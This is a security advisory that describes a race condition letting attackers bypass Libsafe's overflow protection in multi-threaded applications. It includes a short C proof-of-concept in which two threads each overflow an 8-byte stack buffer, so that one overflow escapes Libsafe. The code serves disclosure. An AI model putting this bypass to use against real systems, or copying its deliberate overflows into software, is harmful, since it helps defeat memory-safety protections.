source: http://www.securityfocus.com/bid/13190/info

Libsafe will normally kill an application when certain types of memory corruption are detected, preventing exploitation of some buffer overflow and format string vulnerabilities. A weakness has been reported that may allow Libsafe security failsafe mechanisms to be bypassed.

This vulnerability is due to a race condition that may be exposed when Libsafe is used with multi-threaded applications. The result is that Libsafe security features may be bypassed and an attack that would ordinarily be prevented may succeed. It should be noted that this is an implementation error in Libsafe that does not present a security risk unless there is a memory corruption vulnerability in a multi-threaded application on an affected computer.

This issue was reported in Libsafe 2.0-16. Other versions may also be affected. 

#include <pthread.h>
#include <stdio.h>

int ok = 0;

void *func1(void *none)
{
	char buf[8];
	while(1)
	{
		if(!ok)
			continue;
		strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
		break;
	}
	puts("func1 overflow!");
}

void *func2(void *none)
{
	char buf[8];
	ok = 1;
	strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
	puts("func2 overflow!!");
}

int main()
{
	pthread_t t1, t2;
	
	pthread_create(&t1, NULL, &func1, NULL);
	pthread_create(&t2, NULL, &func2, NULL);
	
	pthread_join(t1, NULL);
	pthread_join(t2, NULL);
	
	return 0;
}